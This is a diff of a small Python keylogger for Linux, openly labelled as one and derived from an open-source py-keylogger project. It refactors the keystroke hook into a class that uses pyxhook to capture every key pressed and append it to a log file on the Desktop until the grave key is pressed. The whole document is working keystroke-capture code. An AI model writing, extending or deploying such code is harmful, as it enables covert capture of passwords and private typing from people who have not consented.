@@ -1,70 +1,45 @@
 """
-Copyright (c) 2017, Nicola Sella
-Modified by Nicola Sella under MIT Licence
+Copyright (c) 2018 Nicola Sella
 
-Original Copyright (c) 2015, Aman Deep
-https://github.com/hiamandeep/py-keylogger
+Modified under the MIT licence from
+Aman Deep's project: https://github.com/hiamandeep/py-keylogger
 
 A simple keylogger witten in python for linux platform
 All keystrokes are recorded in a log file.
 
-The program terminates when grave key(`)
-or a custom key is pressed
+The program terminates when grave key(`) is pressed
 
 grave key is found below Esc key
 
 """
-
+from username import username
 import pyxhook
-import getpass
-import encrypt as enc
+import encrypt
+from encrypt import simpleCrypt
 
-from head import *
-user = getpass.getuser()
 #change this to your log file's path
-log_file = '/home/' + user + '/Desktop/file.log'
-to_log = ''
-print("log")
-#print(to_log)
-try:
-    ascii_escape
-except NameError:
-    #print("ascii exception")
-    ascii_escape = 96
+log_file='/home/' + username + '/Desktop/file.log'
 
-try:
-    if path != "" : log_file = path
-except NameError:
-    #print("path exception")
-    pat = ""
+class keylogger(simpleCrypt):
+    def __init__(self, ascii_char, key = 'secret'):
+        simpleCrypt.__init__(self, key = key)
+        self.ascii_char = ascii_char
 
-#this function is called everytime a key is pressed.
-def OnKeyPress(event):
-    fob = open(log_file, 'a')
-    #fob.write(event.Key)
-    global to_log
-    to_log = to_log + event.Key
-    if len(to_log) >= 64 :
-        to_log = enc.crypt(to_log)
-        fob.write(to_log[:64])
-        #fob.write('\n')
-        to_log = to_log[64:]
-        print( len(to_log) )
-
-    if event.Ascii == ascii_escape: #96 is the ascii value of the grave key (`)
-        if len(to_log) % 64 != 0:
-            print( 64 - len(to_log) )
-            print( len(to_log) )
-            to_log += " " * (64 - len(to_log))
-            to_log = enc.crypt(to_log)
-            fob.write(to_log)
+    #this function is called everytime a key is pressed.
+    def OnKeyPress(self, event):
+        fob=open(log_file,'a')
+        fob.write(event.Key)
+        fob.write('\n')
+    
+        if event.Ascii == self.ascii_char:
             fob.close()
             new_hook.cancel()
-            #instantiate HookManager class
 
+k = keylogger(96, 'key')
+#instantiate HookManager class
 new_hook=pyxhook.HookManager()
 #listen to all keystrokes
-new_hook.KeyDown=OnKeyPress
+new_hook.KeyDown=k.OnKeyPress
 #hook the keyboard
 new_hook.HookKeyboard()
 #start the session
